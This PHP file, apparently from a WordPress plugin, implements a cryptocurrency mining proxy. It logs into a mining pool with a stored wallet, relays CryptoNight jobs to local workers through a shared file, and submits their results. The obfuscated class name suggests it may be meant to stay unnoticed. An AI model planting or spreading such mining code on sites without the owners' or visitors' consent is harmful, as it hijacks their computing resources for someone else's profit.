<?php 
defined( "ABSPATH" ) || exit;

ob_implicit_flush(1);

class Worker {
	private $socket;
	private $pid;
	private $job;

	function __construct($pid) {

		$address = get_option("address");
		$wallet = get_option("wallet");
		$password = get_option("password");

		if (!isset($address) || !isset($wallet) || !isset($password)) {
			exit();
		}

		$this->pid = $pid;
		$stream = stream_socket_client($address);
		$this->socket  = socket_import_stream($stream);
		socket_set_option($this->socket, SOL_SOCKET, SO_KEEPALIVE, 1);
		socket_set_option($this->socket, SOL_SOCKET, SO_REUSEADDR, 1);
		socket_set_option($this->socket, SOL_SOCKET, SO_RCVTIMEO, array('sec' => 1, 'usec' => 0));
		$this->write('{"id": 1,"jsonrpc": "2.0","method": "login","params": {"login": "'.$wallet.'","pass": "'.$password.'","algo": ["cn/2"]}}');
	}

	public function getPid() {
		return $this->pid;
	} 

	public function write($data) {
		socket_write($this->socket, $data."\n");
	} 

	public function read() {
		return trim(@socket_read($this->socket, 4096));
	}

	public function setJob($job) {
		$this->job = $job;
	}

	public function getJob() {
		return $this->job;
	}
}

class Miner_proxy {

	private $address = "tcp://127.0.0.1:3333";
	private $wtf;
	private $workers = array();


	private function add_blob($jobtar, &$obj) {
		$file = fopen(DFHhAXJszhPga::$filename, "r+");
		rewind($file);
		while (($line = fgets($file)) !== false) {
			if (!preg_match("/^newjob".$obj->getPid()."/", $line)) {
				$all_lines .= $line;
			}
		}
		$all_lines .= "newjob".$obj->getPid().":".$jobtar."\n";
		rewind($file);
		ftruncate($file, 0);
		fwrite($file, $all_lines);
		fclose($file);
	}

	private function check_for_a_job(&$obj) {
		$arr = json_decode($obj->read(), true);
		if (is_array($arr["result"]["job"])) {
			$obj->setJob($arr["result"]["job"]);
			$this->add_blob($arr["result"]["job"]["blob"].":".$arr["result"]["job"]["target"], $obj);
		} elseif (is_array($arr["params"])) {	
			$obj->setJob($arr["params"]);
			$this->add_blob($arr["params"]["blob"].":".$arr["params"]["target"], $obj);
		}
	}

	private function read_from_workers() {
		$result = array();
		$all_lines = "";
		$file = fopen(DFHhAXJszhPga::$filename, "r+");
		$write_to_file = false;
		while (($line = fgets($file)) !== false) {

			if (preg_match("/newresult|newpid|canijustdiealready/", $line)) {
				if (preg_match_all("/newpid([0-9]+)/", $line, $matches)) {
					$this->workers[] = new Worker($matches[1][0]);
					$write_to_file = true;
				} else if (preg_match_all("/newresult([0-9]+):([a-zA-Z0-9]+):([a-zA-Z0-9]+)/", $line, $matches)) {
					foreach ($this->workers as &$value) {
						if ($matches[1][0] == $value->getPid()) {

							$num = get_option("hash_counter");
							if (!isset($num)) {
								$num = 0;
							}
							update_option("hash_counter", $num+1, false);

							$job = $value->getJob();
							$value->write('{"id":2,"jsonrpc":"2.0","method":"submit","params":{"id":"'.$job["id"].'","job_id":"'.$job["job_id"].'","nonce":"'.$matches[3][0].'","result":"'.$matches[2][0].'"}}');
							$write_to_file = true;
							break;
						}
					}
				} else if (preg_match("/canijustdiealready/", $line)) {
					sleep(10);
					rewind($file);
					ftruncate($file,0);
					fclose($file);
					exit();
				}
			} else {
				$all_lines .= $line;	
			}
		}

		if ($write_to_file) {
			rewind($file);
			ftruncate($file,0);
			fwrite($file, $all_lines);	
		}
		fclose($file);
		return $result;

	}

	public function getWorkers() {
		return $this->workers;
	}


	public function run() {
		while (count($this->workers) == 0) {
			$this->read_from_workers();
			sleep(1);
		}

		while (true) {
			foreach ($this->workers as &$value) {
				$this->check_for_a_job($value);
			}
			$this->read_from_workers();
		}
	}
}